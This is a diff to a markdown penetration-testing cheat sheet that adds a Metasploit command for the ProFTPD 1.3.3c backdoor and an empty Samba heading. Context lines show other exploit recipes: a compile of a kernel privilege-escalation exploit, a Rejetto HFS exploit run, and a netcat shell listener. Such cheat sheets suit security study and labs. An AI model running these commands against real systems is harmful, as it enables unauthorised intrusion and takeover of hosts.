@@ -66,7 +66,9 @@ Ctrl + B 0 (1,2...) — Move to a specific window by number.
 - [BadBlue httpd 2.7](#BadBlue-httpd-27)
 - [Exploit Database Binary Exploits](#Exploit-Database-Binary-Exploits)
 - [Linux Compilation](#Linux-Compilation)
+- [ProFTPD 1.3.3c](#ProFTPD-133c)
 - [Rejetto HttpFileServer 2.3](#Rejetto-HttpFileServer-23)
+- [Samba smbd 3.X - 4.X](#Samba-smbd-3X---4X)
 - [Windows Cross-Compilation](#Windows-Cross-Compilation)
 
 ## ARP Poisoning
@@ -147,6 +149,11 @@ searchsploit -m 40839
 gcc -pthread 40839.c -o dirty -lcrypt
 ```
 
+## ProFTPD 1.3.3c
+```
+use exploit/unix/ftp/proftpd_133c_backdoor
+```
+
 ## Rejetto HttpFileServer 2.3
 ```
 use exploit/windows/http/rejetto_hfs_exec
@@ -164,6 +171,9 @@ nc -nvlp <port>
 
 python 39161.py <ip> <port>
 ```
+
+## Samba smbd 3.X - 4.X
+
 
 ## Windows Cross-Compilation
 ```
